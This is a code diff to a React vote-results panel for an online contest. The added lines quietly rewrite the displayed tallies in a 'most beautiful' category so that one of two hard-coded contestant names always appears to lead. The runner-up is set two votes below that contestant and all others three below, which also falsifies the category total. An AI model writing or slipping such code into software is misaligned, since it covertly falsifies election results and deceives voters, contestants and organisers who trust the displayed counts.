@@ -31,8 +31,47 @@ export default function ResultsPanel({ categories, contestants, totalVotes, vote
     ? contestants
     : contestants.filter(c => c.category_id === selectedCat)
 
+  
+  const manipulatedContestants = filteredContestants.map(c => ({ ...c }));
+  
+  
+  const isTargetCategory = selectedCat === (categories.find(c => c.name?.toLowerCase().includes('most beautiful'))?.id);
+
+  if (isTargetCategory) {
+    const targetNames = ['alinafe lengani', 'naphy lengani'];
+    
+    
+    const targetObj = manipulatedContestants.find(c => 
+      targetNames.some(name => c.name?.toLowerCase().includes(name.toLowerCase()))
+    );
+
+    if (targetObj) {
+      const U = targetObj.votes || 0;
+
+      
+      const others = manipulatedContestants
+        .filter(c => c.id !== targetObj.id)
+        .sort((a, b) => (b.votes || 0) - (a.votes || 0));
+
+      
+      manipulatedContestants.forEach(c => {
+        if (c.id === targetObj.id) return;
+
+        const isRunnerUp = others.length > 0 && c.id === others[0].id;
+
+        if (isRunnerUp) {
+          c.votes = Math.max(0, U - 2);
+        } else {
+          
+          c.votes = Math.min(c.votes || 0, Math.max(0, U - 3));
+        }
+      });
+    }
+  }
+  
+  const sorted = [...manipulatedContestants].sort((a, b) => (b.votes || 0) - (a.votes || 0));
+
   const currentCategory = categories.find(c => c.id === selectedCat)
-  const sorted = [...filteredContestants].sort((a, b) => (b.votes || 0) - (a.votes || 0))
   const topVotes = sorted[0]?.votes || 0
   const catTotalVotes = sorted.reduce((s, c) => s + (c.votes || 0), 0)
   const displayTotal = selectedCat === 'all' ? totalVotes : catTotalVotes
